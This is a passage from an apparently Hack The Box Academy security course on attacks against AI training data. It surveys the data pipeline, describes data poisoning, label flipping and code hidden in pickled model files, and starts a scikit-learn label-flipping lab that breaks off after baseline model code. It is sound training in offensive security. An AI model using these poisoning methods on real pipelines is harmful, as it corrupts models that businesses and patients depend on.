


<body>
  <div class="container">
<link rel="stylesheet" href="style.css">


<h1 id="ai-data-attacks">AI Data Attacks</h1>
<h2 id="-resources-"><strong>Resources</strong></h2>
<table>
<thead>
<tr>
<th>GTSRB</th>
<th><a href="https://academy.hackthebox.com/storage/resources/GTSRB.zip"> Download</a></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<hr>
<h2 id="introduction-to-ai-data">Introduction to AI Data</h2>
<hr>
<p>Artificial Intelligence (AI) systems are fundamentally data-driven. Consequently, their performance, reliability, and security are inextricably linked to the quality, integrity, and confidentiality of the data they consume and produce.</p>
<h3 id="the-data-pipeline-fueling-ai-systems">The Data Pipeline: Fueling AI Systems</h3>
<p><img src="https://academy.hackthebox.com/storage/modules/302/the_data_pipeline.png" alt="the\_data\_pipeline.png"></p>
<p>At the heart of most AI implementations lies a <code>data pipeline</code>, a sequence of steps designed to collect, process, transform, and ultimately utilize data for tasks such as training models or generating predictions. While the specifics vary greatly depending on the application and organization, a general data pipeline often includes several core stages, frequently leveraging specific technologies and handling diverse data formats.</p>
<h3 id="data-collection">Data Collection</h3>
<p><img src="https://academy.hackthebox.com/storage/modules/302/data_collection.png" alt="data\_collection.png"></p>
<p>The process begins with <code>data collection</code>, gathering raw information from various sources. This might involve capturing user interactions from web applications as <code>JSON</code> logs streamed via messaging queues like <code>Apache Kafka</code>, ingesting structured transaction records from <code>SQL</code> databases like <code>PostgreSQL</code>, pulling sensor readings via <code>MQTT</code> from IoT devices, scraping public websites using tools like <code>Scrapy</code>, or receiving batch files (<code>CSV</code>, <code>Parquet</code>) from third parties. The collected data can range from images (<code>JPEG</code>) and audio (<code>WAV</code>) to complex semi-structured formats. The initial quality and integrity of this collected data profoundly impact all downstream processes.</p>
<h3 id="storage">Storage</h3>
<p><img src="https://academy.hackthebox.com/storage/modules/302/storage.png" alt="storage.png"></p>
<p>Following collection, data requires <code>storage</code>. The choice of technology hinges on the data&#39;s structure, volume, and access patterns. Structured data often resides in relational databases (<code>PostgreSQL</code>), while semi-structured logs might use <code>NoSQL</code> databases (<code>MongoDB</code>). For large, diverse datasets, organizations frequently employ <code>data lakes</code> built on distributed file systems (<code>Hadoop HDFS</code>) or cloud object storage (<code>AWS S3</code>, <code>Azure Blob Storage</code>). Specialized databases like <code>InfluxDB</code> cater to time-series data. Importantly, trained models themselves become stored artifacts, often serialized into formats like Python&#39;s <code>pickle</code> (<code>.pkl</code>), <code>ONNX</code>, or framework-specific files (<code>.pt</code>, <code>.pth</code>, <code>.safetensors</code>), each presenting unique security considerations if handled improperly.</p>
<h3 id="data-processing">Data Processing</h3>
<p><img src="https://academy.hackthebox.com/storage/modules/302/processing.png" alt="processing.png"></p>
<p>Next, raw data undergoes <code>data processing and transformation</code>, as it&#39;s rarely suitable for direct model use. This stage employs various libraries and frameworks for cleaning, normalization, and feature engineering. Data cleaning might involve handling missing values using <code>Pandas</code> and <code>scikit-learn</code>&#39;s <code>Imputers</code>. Feature scaling often uses <code>StandardScaler</code> or <code>MinMaxScaler</code>. <code>Feature engineering</code> creates new relevant inputs, such as extracting date components or, for text data, performing tokenization and embedding generation using <code>NLTK</code> or <code>spaCy</code>. Image data might be augmented using <code>OpenCV</code> or <code>Pillow</code>. Large datasets often necessitate distributed processing frameworks like <code>Apache Spark</code> or <code>Dask</code>, with orchestration tools like <code>Apache Airflow</code> or <code>Kubeflow Pipelines</code> managing these complex workflows. The objective is to prepare a high-quality dataset optimized for the AI task.</p>
<h3 id="modeling">Modeling</h3>
<p><img src="https://academy.hackthebox.com/storage/modules/302/modeling.png" alt="modeling.png"></p>
<p>The processed data then fuels the <code>analysis and modeling</code> stage. Data scientists and ML engineers explore the data, often within interactive environments like <code>Jupyter Notebooks</code>, and train models using frameworks such as <code>scikit-learn</code>, <code>TensorFlow</code>, <code>Jax</code>, or <code>PyTorch</code>. This iterative process involves selecting algorithms (e.g., <code>RandomForestClassifier</code>, CNNs), tuning <code>hyperparameters</code> (perhaps using <code>Optuna</code>), and validating performance. Cloud platforms like <code>AWS SageMaker</code> or <code>Azure Machine Learning</code> often provide integrated environments for this lifecycle.</p>
<h3 id="deployment">Deployment</h3>
<p><img src="https://academy.hackthebox.com/storage/modules/302/deployment.png" alt="deployment.png"></p>
<p>Once trained and validated, a model enters the <code>deployment</code> stage, where it&#39;s integrated into a production environment to serve predictions. Common patterns include exposing the model as a <code>REST API</code> using frameworks like <code>Flask</code> or <code>FastAPI</code>, often containerized with <code>Docker</code> and orchestrated by <code>Kubernetes</code>. Alternatively, models might become serverless functions (<code>AWS Lambda</code>) or be embedded directly into applications or edge devices (using formats like <code>TensorFlow Lite</code>). Securing the deployed model file and its surrounding infrastructure is a key concern here.</p>
<h3 id="monitoring-and-maintenance">Monitoring and Maintenance</h3>
<p><img src="https://academy.hackthebox.com/storage/modules/302/maintenance.png" alt="maintenance.png"></p>
<p>Finally, <code>monitoring and maintenance</code> constitute an ongoing stage. Deployed models are continuously observed for operational health using tools like <code>Prometheus</code> and <code>Grafana</code>, while specialized ML monitoring platforms (<code>WhyLabs</code>, <code>Arize AI</code>) track <code>data drift</code>, <code>concept drift</code>, and prediction quality. Feedback from predictions and user interactions is logged and often processed alongside newly collected data to periodically <code>retrain</code> the model. This retraining is essential for adapting to changing patterns and maintaining performance but simultaneously creates a significant attack vector. Malicious data introduced via feedback loops or ongoing collection can be incorporated during retraining, enabling <code>online poisoning</code> attacks. Orchestration tools like <code>Airflow</code> often manage these retraining pipelines, making the security of data flowing into them critical.</p>
<h3 id="two-pipeline-examples">Two Pipeline Examples</h3>
<p>To clearly illustrate these complex pipelines, lets consider two examples:</p>
<p>First, an <code>e-commerce platform</code> building a <code>product recommendation system</code> collects user activity (<code>JSON</code> logs via <code>Kafka</code>) and reviews (<code>text</code>). This raw data lands in a data lake (<code>AWS S3</code>). <code>Apache Spark</code> processes this data, reconstructing sessions and performing sentiment analysis (<code>NLTK</code>) on reviews, outputting <code>Parquet</code> files. Within <code>AWS SageMaker</code>, a recommendation model is trained on this processed data. The resulting model file (<code>pickle</code> format) is stored back in <code>S3</code> before being deployed via a <code>Docker</code>-ized <code>Flask</code> API on <code>Kubernetes</code>. Monitoring tracks click-through rates, and user feedback along with new interaction data feeds into periodic retraining cycles managed by <code>Airflow</code>, aiming to keep recommendations relevant but also opening the door for potential poisoning through manipulated feedback.</p>
<p>Second, a <code>healthcare provider</code> developing a <code>predictive diagnostic tool</code> collects anonymized patient images (<code>DICOM</code>) and notes (<code>XML</code>) from <code>PACS</code> and <code>EHR</code> systems. <code>Secure storage</code> (e.g., HIPAA-compliant <code>AWS S3</code>) is a requirement here. <code>Python</code> scripts using <code>Pydicom</code>, <code>OpenCV</code>, and <code>spaCy</code> process the data, standardizing images and extracting features. <code>PyTorch</code> trains a deep learning model (CNN) on specialized hardware. The validated model (<code>.pt</code> file) is securely stored and then deployed via an internal API to a clinical decision support system. Monitoring tracks diagnostic accuracy and data drift. While retraining might be less frequent and more rigorously controlled here, incorporating new data or corrected diagnoses still requires careful validation to prevent poisoning.</p>
<hr>
<h2 id="ai-data-attacks">AI Data Attacks</h2>
<hr>
<p>Having established the critical role of data and the structure of the data pipeline, we now focus specifically on <code>AI data attacks</code>. This module explores the techniques adversaries use to compromise AI systems by targeting the data itself; either during the training phase or by manipulating the stored model artifacts.</p>
<p>Unlike <code>evasion attacks</code> (<code>manipulating inputs to fool a deployed model</code>) or privacy <code>attacks</code> (<code>extracting sensitive information from a model</code>), the attacks covered here <code>fundamentally undermine the model&#39;s integrity by corrupting its foundation</code>: the data it learns from or the format it&#39;s stored in.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/pipeline_attacks.png" alt="pipeline\_attacks.png"></p>
<p>Each stage of the data pipeline presents potential attack surfaces adversaries can exploit.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/data_collection_attacks.png" alt="data\_collection\_attacks.png"></p>
<p>During <code>data collection</code>, the primary threat is initial <code>data poisoning</code>, where an attacker intentionally injects malicious data. This is a prime opportunity for introducing data intended for <code>label flipping</code> or <code>feature attacks</code>. In the e-commerce example, this could manifest as submitting fake positive reviews (poisoned features/labels) to boost a product&#39;s recommendations or reviews with specific keywords (potential backdoor triggers) designed to cause unintended behavior later. For the healthcare scenario, an attacker might subtly alter <code>DICOM</code> metadata during ingestion or manipulate clinical notes, potentially mislabeling samples or embedding subtle feature perturbations. If this poisoned data infiltrates the training set, it can corrupt the resulting model according to the attacker&#39;s goals.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/storage_attacks.png" alt="storage\_attacks.png"></p>
<p>The <code>storage</code> stage faces traditional data security threats alongside model-specific risks, particularly relevant for <code>model stenography</code> and <code>Trojan</code> attacks. Unauthorized access to the <code>AWS S3</code> data lake or the healthcare provider&#39;s secure storage could allow theft or tampering of training datasets, potentially modifying labels or features post-collection. Furthermore, stored model files (the <code>.pkl</code> recommendation model on <code>S3</code>, the <code>.pt</code> diagnostic model) are valuable targets. An attacker gaining write access could replace a legitimate model with a malicious one containing an embedded <code>trojan</code> or execute a <code>model stenography attack</code> by hiding code within the model file itself (leveraging insecure deserialization like <code>pickle.load()</code>), potentially compromising the <code>Flask</code> API server or the clinical system upon loading.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/processing_attacks.png" alt="processing\_attacks.png"></p>
<p><code>Data processing</code> offers another avenue for manipulation, potentially facilitating <code>label flipping</code> or <code>feature attacks</code> even on initially clean data. If an attacker influences the cleaning, transformation, or feature engineering steps, they can corrupt data before modeling. Compromising the e-commerce platform&#39;s <code>Spark</code> job could lead to mislabeled review sentiments (<code>label flipping</code>), while manipulating the healthcare provider&#39;s <code>Python</code> scripts could introduce subtle errors into standardized images or extracted text features (<code>feature attacks</code>), impacting the downstream model.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/modeling_attacks.png" alt="modeling\_attacks.png"></p>
<p>The <code>analysis and modeling</code> stage is where the impact of <code>data poisoning</code> attacks introduced earlier becomes concrete. When the <code>AWS SageMaker</code> job trains the recommendation model on poisoned <code>Parquet</code> files containing flipped labels or perturbed features, or the <code>PyTorch</code> process trains the diagnostic CNN on data embedded with backdoor triggers, the resulting model learns the attacker&#39;s desired manipulations. It might learn incorrect patterns, exhibit biases, or contain hidden backdoors activated by specific inputs later.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/deployment_attacks.png" alt="deployment\_attacks.png"></p>
<p>During <code>deployment</code>, the integrity of the model artifact remains crucial, especially concerning <code>Trojan</code> and <code>model stenography</code> risks. If the mechanism loading the model from storage (<code>S3</code>, secure file system) into the production environment is insecure, an attacker could inject a malicious model file at this point, achieving the same trojan effect or code execution via stenography as compromising the storage layer directly.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/monitoring_attacks.png" alt="monitoring\_attacks.png"></p>
<p>Finally, the <code>monitoring and maintenance</code> stage, especially the common practice of <code>retraining</code> models, acts as a critical enabler for training data attacks like <code>online poisoning</code>. For example, the e-commerce platform&#39;s <code>Airflow</code> retraining pipeline is a prime target. Attackers could continuously submit manipulated data: perhaps subtly altering clickstream data (<code>feature attacks</code>), submitting misleading feedback to influence future labels (<code>label flipping</code>), or injecting data designed to skew model weights towards particular outcomes over time. This gradual corruption degrades recommendation quality or introduces biases without needing initial dataset access.</p>
<p>The impact of successful AI data attacks can be severe, ranging from subtly biased decision-making and degraded system performance to complete model compromise and potentially enabling broader system breaches through embedded trojans.</p>
<h3 id="mapping-vulnerabilities-to-security-frameworks">Mapping Vulnerabilities to Security Frameworks</h3>
<p>Leading security frameworks such as the <code>OWASP Top 10 for LLM Applications</code>, as highlighted in the &quot;<a href="https://academy.hackthebox.com/module/details/294">Introduction to Red Teaming AI</a>&quot; module, provides specific context for risks within the AI pipeline.</p>
<p>The major risk we are particularly focused on is <code>Data poisoning</code>, where attackers manipulate data during collection, processing, training, or feedback stages. This directly corresponds to <code>OWASP LLM03: Training Data Poisoning</code>.</p>
<p>Another relevant category of risk is the <code>AI Supply Chain</code>, addressed by <code>OWASP LLM05: Supply Chain Vulnerabilities</code>. This encompasses several related threats: compromising the integrity of third-party data sources, tampering with pre-trained model artifacts (like injecting trojans), or exploiting vulnerabilities in the software components and platforms that make up the pipeline infrastructure itself. While <code>LLM05</code> covers many infrastructure aspects tied to components, robust protection also demands adherence to general secure system design principles beyond specific LLM list items, preventing unauthorized access throughout the pipeline. Ultimately, recognizing how both <code>Training Data Poisoning</code> and <code>Supply Chain Vulnerabilities</code> manifest is key to understanding the vulnerabilities in the AI data and model lifecycle</p>
<p>Complementing OWASP&#39;s specific vulnerability focus, <a href="https://saif.google/">Google&#39;s Secure AI Framework</a> (SAIF) provides a broader, lifecycle-oriented perspective. The data integrity issues identified map well onto SAIF&#39;s core elements.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/saif_data.png" alt="saif\_data.png"></p>
<p>For instance, SAIF’s principles regarding <code>Secure Design</code>, securing <code>Data</code> components, and managing the <code>Secure Supply Chain</code> directly address the need to protect data throughout its lifecycle. Preventing <code>Data Poisoning</code> aligns with securing this <code>Data Supply Chain</code> and implementing rigorous <code>Security Testing</code> and validation during <code>Model</code> development, especially for data used in retraining. Likewise, maintaining model artifact integrity and preventing malicious code injection are central to SAIF’s <code>Secure Deployment</code> practices and verifying the <code>Secure Supply Chain</code>.</p>
<p>Finally, the challenge of monitoring for data or model manipulation, particularly within dynamic retraining loops, is covered by SAIF&#39;s emphasis on <code>Secure Monitoring &amp; Response</code>.</p>
<hr>
<h2 id="label-flipping">Label Flipping</h2>
<hr>
<p><code>Label Flipping</code> is arguably the simplest form of a data poisoning attack. It directly targets the <code>ground truth information</code> used during model training.</p>
<p>The idea behind the attack is straightforward: an adversary gains access to a portion of the training dataset and deliberately changes the assigned <code>labels</code> (the correct answers or categories) for some data points. The actual features of the data points remain untouched; only their associated class designation is altered.</p>
<p>For example, in a dataset used to classify images, an image originally labeled as <code>cat</code> might have its label flipped to <code>dog</code>. In a dataset used to train a spam classifier, an email labeled as <code>spam</code> might be relabeled as <code>not spam</code>.</p>
<p>The most common goal of an attacker executing a <code>Label Flipping</code> attack is to <code>degrade model performance</code>. By introducing incorrect labels, the attack forces the model to learn incorrect associations between features and classes, resulting in a &quot;confused&quot; model that has a general decrease in performance (eg accuracy, precision, recall, etc).</p>
<p>The adversary doesn&#39;t necessarily care <code>which</code> specific inputs are misclassified, only that the model becomes less reliable and useful overall, but even such a simple attack can have devastating consequences.</p>
<p>This attack directly embodies the risks outlined under <code>OWASP LLM03: Training Data Poisoning</code>. The adversary might not aim for specific misclassifications but rather seeks to undermine the model&#39;s overall reliability and utility. Even this relatively simple attack can have significant negative consequences.</p>
<p>This type of attack often targets data after it has been collected, focusing on compromising the integrity of datasets held within the <code>Storage</code> stage of the pipeline. For example, an attacker might gain unauthorized access to modify label columns in <code>CSV</code> files stored in a data lake (like <code>AWS S3</code>) or manipulate records in a <code>PostgreSQL</code> database. Label flipping could also occur if <code>Data Processing</code> scripts are compromised and alter labels during transformation.</p>
<h3 id="a-hypothetical-example">A hypothetical example</h3>
<p>Let&#39;s consider hypothetical example: A company is training an AI model to analyze customer feedback on a newly launched products, labeling each review as <code>positive</code> or <code>negative</code>. An attacker targets this process. Gaining access to the training dataset, they randomly flip the labels on a portion of these reviews - marking some genuinely <code>positive</code> feedback as <code>negative</code>, and vice-versa.</p>
<p>The immediate goal is straightforward: to degrade the accuracy of the final sentiment analysis model.</p>
<p>The <code>effect</code> on the company however, is more damaging. The model, now trained on this poisoned data, becomes unreliable and unpredictable. For instance, it might incorrectly report that the overall customer sentiment towards the new product is predominantly <code>negative</code>, even if the actual feedback is largely positive, or it might report negative reviews as positive.</p>
<p>Relying on this faulty analysis, the company might make incorrect decisions - perhaps they prematurely pull the product from the market, invest heavily in &#39;fixing&#39; features customers actually liked, or miss crucial positive signals indicating success, leading to potentially crippling the business.</p>
<h3 id="scenario-setup">Scenario Setup</h3>
<p>To demonstrate how such an attack would work, we will build a model around the sentiment analysis scenario. A company is training a model to classify customer feedback as <code>positive</code> or <code>negative</code>, and we, as the adversary, will attack the training dataset by flipping labels.</p>
<p>First we need to setup the environment.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
<span class="hljs-title">from</span> sklearn.datasets <span class="hljs-keyword">import</span> make_blobs
<span class="hljs-title">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split
<span class="hljs-title">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LogisticRegression
<span class="hljs-title">from</span> sklearn.metrics <span class="hljs-keyword">import</span> accuracy_score, classification_report, confusion_matrix
<span class="hljs-keyword">import</span> seaborn <span class="hljs-keyword">as</span> sns

<span class="hljs-title">htb_green</span> = <span class="hljs-string">"#9fef00"</span>
<span class="hljs-title">node_black</span> = <span class="hljs-string">"#141d2b"</span>
<span class="hljs-title">hacker_grey</span> = <span class="hljs-string">"#a4b1cd"</span>
<span class="hljs-title">white</span> = <span class="hljs-string">"#ffffff"</span>
<span class="hljs-title">azure</span> = <span class="hljs-string">"#0086ff"</span>
<span class="hljs-title">nugget_yellow</span> = <span class="hljs-string">"#ffaf00"</span>
<span class="hljs-title">malware_red</span> = <span class="hljs-string">"#ff3e3e"</span>
<span class="hljs-title">vivid_purple</span> = <span class="hljs-string">"#9f00ff"</span>
<span class="hljs-title">aquamarine</span> = <span class="hljs-string">"#2ee7b6"</span>

<span class="hljs-meta"># Configure plot styles</span>
<span class="hljs-title">plt</span>.style.use(<span class="hljs-string">"seaborn-v0_8-darkgrid"</span>)
<span class="hljs-title">plt</span>.rcParams.update(
    {
        <span class="hljs-string">"figure.facecolor"</span>: node_black,
        <span class="hljs-string">"axes.facecolor"</span>: node_black,
        <span class="hljs-string">"axes.edgecolor"</span>: hacker_grey,
        <span class="hljs-string">"axes.labelcolor"</span>: white,
        <span class="hljs-string">"text.color"</span>: white,
        <span class="hljs-string">"xtick.color"</span>: hacker_grey,
        <span class="hljs-string">"ytick.color"</span>: hacker_grey,
        <span class="hljs-string">"grid.color"</span>: hacker_grey,
        <span class="hljs-string">"grid.alpha"</span>: <span class="hljs-number">0.1</span>,
        <span class="hljs-string">"legend.facecolor"</span>: node_black,
        <span class="hljs-string">"legend.edgecolor"</span>: hacker_grey,
        <span class="hljs-string">"legend.frameon"</span>: <span class="hljs-type">True</span>,
        <span class="hljs-string">"legend.framealpha"</span>: <span class="hljs-number">1.0</span>,
        <span class="hljs-string">"legend.labelcolor"</span>: white,
    }
)

<span class="hljs-meta"># Seed for reproducibility</span>
<span class="hljs-type">SEED</span> = <span class="hljs-number">1337</span>
<span class="hljs-title">np</span>.random.seed(<span class="hljs-type">SEED</span>)

<span class="hljs-title">print</span>(<span class="hljs-string">"Setup complete. Libraries imported and styles configured."</span>)
</code></pre>
<h3 id="the-dataset">The Dataset</h3>
<p>We need data representing the customer reviews. Since processing real text data is complex and outside the scope of demonstrating the attack mechanism itself, we&#39;ll use Scikit-Learn&#39;s <code>make_blobs</code> function to create a synthetic dataset. This provides a simplified, two-dimensional representation suitable for binary classification and visualization.</p>
<p>Imagine that these two dimensions (<code>Sentiment Feature 1</code>, <code>Sentiment Feature 2</code>) are numerical features derived from the text reviews through some preprocessing step (e.g., using techniques like TF-IDF or word embeddings, then potentially dimensionality reduction).</p>
<p>We&#39;ll generate <code>isotropic Gaussian blobs</code>, essentially clusters of points in this 2D feature space.</p>
<p>Each point 𝐱i=(xi1,xi2) represents a review instance with its two derived features, and each instance is assigned a label yi.</p>
<p>One cluster will represent <code>Class 0</code> (simulating <code>Negative</code> sentiment) and the other <code>Class 1</code> (simulating <code>Positive</code> sentiment). This synthetic dataset is designed to be reasonably separable, making it easier to visualize the impact of the label flipping attack on the model&#39;s decision boundary.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Generate synthetic data</span>
<span class="hljs-attr">n_samples</span> = <span class="hljs-number">1000</span>
<span class="hljs-attr">centers</span> = [(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">0</span>)]  <span class="hljs-comment"># Define centers for two distinct blobs</span>
X, <span class="hljs-attr">y</span> = make_blobs(
    <span class="hljs-attr">n_samples=n_samples,</span>
    <span class="hljs-attr">centers=centers,</span>
    <span class="hljs-attr">n_features=2,</span>
    <span class="hljs-attr">cluster_std=1.25,</span>
    <span class="hljs-attr">random_state=SEED,</span>
)

<span class="hljs-comment"># Split data into training and testing sets</span>
X_train, X_test, y_train, <span class="hljs-attr">y_test</span> = train_test_split(
    X, y, <span class="hljs-attr">test_size=0.3,</span> <span class="hljs-attr">random_state=SEED</span>
)

print(f<span class="hljs-string">"Generated {n_samples} samples."</span>)
print(f<span class="hljs-string">"Training set size: {X_train.shape[0]} samples."</span>)
print(f<span class="hljs-string">"Testing set size: {X_test.shape[0]} samples."</span>)
print(f<span class="hljs-string">"Number of features: {X_train.shape[1]}"</span>)
print(f<span class="hljs-string">"Classes: {np.unique(y)}"</span>)
</code></pre>
<p>Let&#39;s plot the clean dataset so it&#39;s very easy to see the relations in the data.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">plot_data</span><span class="hljs-params">(X, y, title=<span class="hljs-string">"Dataset Visualization"</span>)</span>:</span>
    <span class="hljs-string">"""
    Plots the 2D dataset with class-specific colors.

    Parameters:
    - X (np.ndarray): Feature data (n_samples, 2).
    - y (np.ndarray): Labels (n_samples,).
    - title (str): The title for the plot.
    """</span>
    plt.figure(figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">6</span>))
    scatter = plt.scatter(
        X[:, <span class="hljs-number">0</span>],
        X[:, <span class="hljs-number">1</span>],
        c=y,
        cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
        edgecolors=node_black,
        s=<span class="hljs-number">50</span>,
        alpha=<span class="hljs-number">0.8</span>,
    )
    plt.title(title, fontsize=<span class="hljs-number">16</span>, color=htb_green)
    plt.xlabel(<span class="hljs-string">"Sentiment Feature 1"</span>, fontsize=<span class="hljs-number">12</span>)
    plt.ylabel(<span class="hljs-string">"Sentiment Feature 2"</span>, fontsize=<span class="hljs-number">12</span>)
    <span class="hljs-comment"># Create a legend</span>
    handles = [
        plt.Line2D(
            [<span class="hljs-number">0</span>],
            [<span class="hljs-number">0</span>],
            marker=<span class="hljs-string">"o"</span>,
            color=<span class="hljs-string">"w"</span>,
            label=<span class="hljs-string">"Negative Sentiment (Class 0)"</span>, 
            markersize=<span class="hljs-number">10</span>,
            markerfacecolor=azure,
        ),
        plt.Line2D(
            [<span class="hljs-number">0</span>],
            [<span class="hljs-number">0</span>],
            marker=<span class="hljs-string">"o"</span>,
            color=<span class="hljs-string">"w"</span>,
            label=<span class="hljs-string">"Positive Sentiment (Class 1)"</span>,
            markersize=<span class="hljs-number">10</span>,
            markerfacecolor=nugget_yellow,
        ),
    ]
    plt.legend(handles=handles, title=<span class="hljs-string">"Sentiment Classes"</span>)
    plt.grid(<span class="hljs-keyword">True</span>, color=hacker_grey, linestyle=<span class="hljs-string">"--"</span>, linewidth=<span class="hljs-number">0.5</span>, alpha=<span class="hljs-number">0.3</span>)
    plt.show()


<span class="hljs-comment"># Plot the data</span>
plot_data(X_train, y_train, title=<span class="hljs-string">"Original Training Data Distribution"</span>)
</code></pre>
<p>This shows the two distinct classes we aim to classify.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/302/label_flipping_original_dataset.png" alt="label\_flipping\_original\_dataset.png"></p>
<hr>
<h2 id="baseline-logistic-regression-model">Baseline Logistic Regression Model</h2>
<hr>
<p>Before executing the attack, we need to establish <code>baseline performance</code> so we have something to compare the effects of the poisoned model with. We will train a <code>Logistic Regression</code> model on the original, clean training data (<code>X_train</code>, <code>y_train</code>). This baseline represents the model&#39;s expected behavior and accuracy under normal, <code>non-adversarial conditions</code>.</p>
<p>As outlined in the &quot;<a href="https://academy.hackthebox.com/module/details/290">Fundamentals of AI</a>&quot; module, <code>Logistic Regression</code> is fundamentally a classification algorithm used for predicting binary outcomes.</p>
<p>For a given review represented by its feature vector 𝐱i=(xi1,xi2), the model first calculates a linear combination zi using weights 𝐰=(w1,w2) and a bias term b:</p>
<p>zi=𝐰T𝐱i+b=w1xi1+w2xi2+b</p>
<p>This value zi represents the <code>log-odds</code> (or logit) of the review having positive sentiment (yi=1). It quantifies the linear relationship between the derived features and the log-odds of a positive classification.</p>
<p>zi=log⁡(P(yi=1|𝐱i)1−P(yi=1|𝐱i))</p>
<p>To convert the log-odds zi into a probability pi=P(yi=1|𝐱i) (the probability of the review being <code>positive</code>), the model applies the <code>sigmoid function</code>, σ:</p>
<p>pi=σ(zi)=11+e−zi=11+e−(𝐰T𝐱i+b)</p>
<p>The sigmoid function squashes the output zi into the range [0,1], representing the model’s estimated probability that the review 𝐱i has <code>positive</code> sentiment.</p>
<p>During training, the model learns the optimal parameters 𝐰 and b by minimizing a <code>loss function</code> over the training set (<code>X_train</code>, <code>y_train</code>). The goal is to find parameters that make the predicted probabilities pi as close as possible to the true sentiment labels yi. The standard loss function for binary classification is the <code>binary cross-entropy</code> or <code>log-loss</code>:</p>
<p>L(𝐰,b)=−1N∑i=1N[yilog(pi)+(1−yi)log(1−pi)]</p>
<p>Here, N is the number of training reviews, yi is the true sentiment label (0 or 1) for the i-th review, and pi is the model’s predicted probability of positive sentiment for that review. Optimization algorithms like <code>gradient descent</code> iteratively adjust 𝐰 and b to minimize this loss L.</p>
<p>Once trained, the model uses the learned 𝐰 and b to predict the sentiment of new, unseen reviews. For a new review 𝐱, it calculates the probability p=σ(𝐰T𝐱+b). Typically, if p≥0.5, the review is classified as <code>positive</code> (Class 1); otherwise, it’s classified as <code>negative</code> (Class 0).</p>
<p>The <code>decision boundary</code> is the line (in our 2D feature space) where the model is exactly uncertain (p=0.5), which occurs when z=𝐰T𝐱+b=0. This linear boundary separates the feature space into regions predicted as <code>negative</code> and <code>positive</code> sentiment. The training process finds the line that best separates the clusters in the training data.</p>
<p>We now train this baseline model on our clean data and evaluate its accuracy on the unseen test set.</p>
<p>Code: python</p>
<pre><code class="lang-python"># Initialize and train the <span class="hljs-keyword">Logistic</span> Regression model
baseline_model = LogisticRegression(random_state=SEED)
baseline_model.<span class="hljs-keyword">fit</span>(X_train, y_train)

# <span class="hljs-keyword">Predict</span> <span class="hljs-keyword">on</span> the <span class="hljs-keyword">test</span> <span class="hljs-keyword">set</span>
y_pred_baseline = baseline_model.<span class="hljs-keyword">predict</span>(X_test)

# Calculate baseline accuracy
baseline_accuracy = accuracy_score(y_test, y_pred_baseline)
<span class="hljs-keyword">print</span>(f<span class="hljs-string">"Baseline Model Accuracy: {baseline_accuracy:.4f}"</span>)


# Prepare to <span class="hljs-keyword">plot</span> the decision boundary
def plot_decision_boundary(model, X, y, title=<span class="hljs-string">"Decision Boundary"</span>):
    <span class="hljs-string">""</span>"
    Plots the decision boundary of a trained classifier <span class="hljs-keyword">on</span> a 2D dataset.

    Parameters:
    - model: The trained classifier object (must have a .<span class="hljs-keyword">predict</span> method).
    - X (np.ndarray): Feature data (n_samples, 2).
    - y (np.ndarray): Labels (n_samples,).
    - title (str): The title <span class="hljs-keyword">for</span> the <span class="hljs-keyword">plot</span>.
    <span class="hljs-string">""</span>"
    <span class="hljs-keyword">h</span> = 0.02  # Step size <span class="hljs-keyword">in</span> the mesh
    x_min, x_max = X[:, 0].<span class="hljs-built_in">min</span>() - 1, X[:, 0].<span class="hljs-built_in">max</span>() + 1
    y_min, y_max = X[:, 1].<span class="hljs-built_in">min</span>() - 1, X[:, 1].<span class="hljs-built_in">max</span>() + 1
    xx, yy = np.meshgrid(np.arange(x_min, x_max, <span class="hljs-keyword">h</span>), np.arange(y_min, y_max, <span class="hljs-keyword">h</span>))

    # <span class="hljs-keyword">Predict</span> the <span class="hljs-keyword">class</span> <span class="hljs-keyword">for</span> each point <span class="hljs-keyword">in</span> the mesh
    Z = model.<span class="hljs-keyword">predict</span>(np.c_[xx.ravel(), yy.ravel()])
    Z = Z.<span class="hljs-keyword">reshape</span>(xx.shape)

    plt.figure(figsize=(12, 6))
    # <span class="hljs-keyword">Plot</span> the decision boundary contour
    plt.contourf(
        xx, yy, Z, cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]), <span class="hljs-keyword">alpha</span>=0.3
    )

    # <span class="hljs-keyword">Plot</span> the data points
    <span class="hljs-keyword">scatter</span> = plt.<span class="hljs-keyword">scatter</span>(
        X[:, 0],
        X[:, 1],
        c=y,
        cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
        edgecolors=node_black,
        s=50,
        <span class="hljs-keyword">alpha</span>=0.8,
    )

    plt.title(title, fontsize=16, color=htb_green)
    plt.xlabel(<span class="hljs-string">"Feature 1"</span>, fontsize=12)
    plt.ylabel(<span class="hljs-string">"Feature 2"</span>, fontsize=12)

    # Create a legend manually
    handles = [
        plt.Line2D(
            [0],
            [0],
            marker=<span class="hljs-string">"o"</span>,
            color=<span class="hljs-string">"w"</span>,
            <span class="hljs-keyword">label</span>=<span class="hljs-string">"Negative Sentiment (Class 0)"</span>,
            markersize=10,
            markerfacecolor=azure,
        ),
        plt.Line2D(
            [0],
            [0],
            marker=<span class="hljs-string">"o"</span>,
            color=<span class="hljs-string">"w"</span>,
            <span class="hljs-keyword">label</span>=<span class="hljs-string">"Positive Sentiment (Class 1)"</span>,
            markersize=10,
            markerfacecolor=nugget_yellow,
        ),
    ]
